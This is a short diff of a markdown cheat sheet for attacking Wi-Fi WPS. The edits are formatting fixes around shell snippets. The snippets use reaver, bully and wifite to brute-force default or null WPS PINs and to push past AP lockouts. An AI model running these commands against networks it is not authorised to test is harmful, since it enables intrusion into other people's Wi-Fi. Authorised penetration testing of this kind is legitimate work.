@@ -43,10 +43,7 @@ Test common default PINs and Null PIN
 `default-pins.sh`
 
 ```bash
-#!/bin/bash
-
 for pin in '' 12345670 00000000 11111111 01230123 31415926; do reaver -i wlan1mon -b $ap_mac -c $channel -f -N -g 1 -vv -p "$pin" done
-
 ```
 
 
@@ -68,7 +65,7 @@ bully wlan1mon -b $ap_mac -c $channel -e $essid -d -v 4 -F -D -A -C -l 90 -w ~/.
 
 For difficult/locked APs
 
-`reaver2.sh
+`reaver2.sh`
 
 ```bash
 #!/bin/bash
@@ -99,11 +96,9 @@ reaver -i wlan1mon -b $ap_mac -c $channel -e $ap_name -L -N -vv -d 15 -T 1 -r 2:
 
 Custom wifite settings for automated attacks
 
-`wifite-wps.sh
+`wifite-wps.sh`
 
 ```bash
-#!/bin/bash
-# Wifite with custom options
 wifite --wps-only --bully --ignore-locks --kill -i wlan1mon
 ```
 
